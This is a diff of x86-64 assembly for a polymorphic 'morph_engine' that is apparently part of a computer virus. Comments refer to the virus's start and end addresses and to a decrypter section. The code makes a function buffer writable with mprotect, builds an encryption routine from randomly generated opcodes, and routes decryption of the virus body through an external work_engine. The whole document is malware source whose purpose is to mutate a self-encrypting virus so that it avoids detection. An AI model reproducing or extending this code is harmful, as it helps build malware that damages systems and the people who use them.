@@ -2,6 +2,7 @@
 
 global morph_engine
 extern work_engine
+extern work_engine.decryption_function
 extern rand
 %define OPCODE_ADD_REG 0x01
 %define OPCODE_SUB_REG 0x29
@@ -32,6 +33,12 @@ mov [rbp-0x20],	rdx ; size of virus in hexa
 mov [rbp-0x18],	rcx ; offset of decrypter section
 
 
+; call decrypt engine
+mov rdi, [rbp-0x30]
+add rdi, [rbp-0x28]
+mov rsi, [rbp-0x20]
+call work_engine
+
 
 ; ; do stuff here
 ; call getpagesize
@@ -51,11 +58,31 @@ mov [rbp-0x18],	rcx ; offset of decrypter section
 ; call mprotect
 
 
+	; ; unprotect the encryption function buffer from write operations
+	; call    getpagesize
+	; mov     rcx, rax
+	; sub     rcx, 1
+	; mov     rdi, .encryption_function
+	; mov     rsi, FUNC_SIZE
+	; mov     rax, rdi
+	; add     rsi, rcx
+	; not     rcx
+	; and     rdi, rcx
+	; sub     rax, rdi
+	; add     rsi, rax
+	; and     rsi, rcx
+	; mov     [rbp-0x10], rdi
+	; mov     [rbp-0x8 ], rsi
+	; mov     edx, 0x7
+	; call    mprotect
+
+
+
 	; unprotect the encryption function buffer from write operations
 	call    getpagesize
 	mov     rcx, rax
 	sub     rcx, 1
-	mov     rdi, .encryption_function
+	mov     rdi, work_engine.decryption_function
 	mov     rsi, FUNC_SIZE
 	mov     rax, rdi
 	add     rsi, rcx
@@ -70,11 +97,9 @@ mov [rbp-0x18],	rcx ; offset of decrypter section
 	call    mprotect
 
 
-
-
 ; set up needed values
-mov r12, .encryption_function
-mov rbx, .encryption_function
+mov r12, work_engine.decryption_function
+mov rbx, work_engine.decryption_function
 add rbx, FUNC_SIZE
 sub rbx, 0x1
 ; must use rbx here because rbx is the only one that will not change on rand call later
@@ -165,40 +190,40 @@ mov r15, ModRegRM
 	; mov     edx, 0x5
 	; call    mprotect
 
-	; call decrypt engine
-	mov rdi, [rbp-0x30]
-	add rdi, [rbp-0x28]
+	; mov rbx, [rbp-0x30]
+	; mov rsi, [rbp-0x28]
+	; add rsi, rbx
+	; ; rsi = full address of virus.start
+	; mov rdi, [rbp-0x20]
+	; add rdi, rsi
+	; ; rdi = full address of the virus.end
+
+	mov rbx, [rbp-0x30]
+	mov rdi, [rbp-0x28]
+	add rdi, rbx
+	; rdi = full address of virus.start
 	mov rsi, [rbp-0x20]
 	call work_engine
 
-	mov rbx, [rbp-0x30]
-	mov rsi, [rbp-0x28]
-	add rsi, rbx
-	; rsi = full address of virus.start
-	mov rdi, [rbp-0x20]
-	add rdi, rsi
-	; rdi = full address of the virus.end
+; .encryption_loop:
+; 	; load first 16bytes of memory data to registers
+; 	mov eax, [rsi]
+; 	mov ebx, [rsi+0x4]
+; 	mov ecx, [rsi+0x8]
+; 	mov edx, [rsi+0xC]
 
-
-.encryption_loop:
-	; load first 16bytes of memory data to registers
-	mov eax, [rsi]
-	mov ebx, [rsi+0x4]
-	mov ecx, [rsi+0x8]
-	mov edx, [rsi+0xC]
-
-.encryption_function:
-	times FUNC_SIZE db OP_NOP
-	; put back the data to where it was taken from
-	mov [rsi], eax
-	mov [rsi+0x4], ebx
-	mov [rsi+0x8], ecx
-	mov [rsi+0xC], edx
-	add rsi, 0x10
-	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
-	cmp rsi, rdi
-	;compare if rsi = rdi, signalling end of decryption
-	jne .encryption_loop
+; .encryption_function:
+; 	times FUNC_SIZE db OP_NOP
+; 	; put back the data to where it was taken from
+; 	mov [rsi], eax
+; 	mov [rsi+0x4], ebx
+; 	mov [rsi+0x8], ecx
+; 	mov [rsi+0xC], edx
+; 	add rsi, 0x10
+; 	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
+; 	cmp rsi, rdi
+; 	;compare if rsi = rdi, signalling end of decryption
+; 	jne .encryption_loop
 
 	xor rax,rax 
 xor rax,rax 
